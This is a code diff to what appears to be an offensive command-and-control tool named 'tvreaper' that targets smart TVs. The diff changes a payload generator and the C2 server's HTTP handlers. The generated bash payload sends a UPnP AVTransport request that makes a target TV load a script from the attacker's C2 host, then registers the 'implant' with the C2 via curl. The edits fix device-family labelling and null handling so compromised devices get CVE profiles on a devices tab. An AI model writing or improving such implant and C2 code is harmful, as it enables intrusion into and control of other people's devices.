@@ -344,8 +344,15 @@ curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
 echo "Implant installed. C2: {c2_ip}"
 """
     else:
+        # No family-specific install vector (chromecast / hisense / tcl /
+        # DLNA). The push below is the generic DLNA one, but the header and the
+        # registration must name the family that was actually asked for:
+        # labeling a Hisense payload "Generic DLNA" — and registering it as
+        # "Unknown" — is what left connected devices with no device type and no
+        # CVE profile on the Devices tab.
+        register_family = family if family not in ("", "dlna") else "Unknown"
         payload = f"""#!/bin/bash
-# Generic DLNA Exploit Payload
+# Generic fallback payload for family '{family}' (no install method registered)
 # Target: {target_ip}
 # C2: {c2_ip}:{C2_PORT}
 echo "Attempting DLNA injection on {target_ip}..."
@@ -355,7 +362,7 @@ curl -X POST http://{target_ip}:49152/upnp/control/AVTransport \\
   -d '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1"><InstanceID>0</InstanceID><CurrentURI>http://{c2_ip}/tvreaper.js</CurrentURI></u:SetAVTransportURI></s:Body></s:Envelope>'
 curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
   -H "Content-Type: application/json" \\
-  -d '{{"ip":"{target_ip}","family":"Unknown","entry":"dlna"}}'
+  -d '{{"ip":"{target_ip}","family":"{register_family}","entry":"{family}"}}'
 echo "Implant attempted. C2: {c2_ip}"
 """
 
@@ -945,8 +952,8 @@ class C2Handler(BaseHTTPRequestHandler):
             body = self.rfile.read(length)
             data = json.loads(body)
             target_ip = data.get('target_ip', '')
-            family = data.get('family', 'dlna')
-            c2_ip = data.get('c2_ip', get_local_ip())
+            family = data.get('family') or 'dlna'
+            c2_ip = data.get('c2_ip') or get_local_ip()
 
             if not target_ip:
                 self.send_json(400, {"error": "Missing target_ip"})
@@ -995,9 +1002,11 @@ class C2Handler(BaseHTTPRequestHandler):
         """
         try:
             data = self._read_json_body()
-            ip = str(data.get("ip", "")).strip()
-            family = str(data.get("family", "")).strip()
-            tv_type = str(data.get("tv_type", "")).strip()
+            # `or ""` throughout: a JSON null must not become the literal
+            # string 'None', which is truthy and would skip family lookup.
+            ip = str(data.get("ip") or "").strip()
+            family = str(data.get("family") or "").strip()
+            tv_type = str(data.get("tv_type") or "").strip()
 
             if not ip:
                 self.send_json(400, {"error": "Missing ip"})
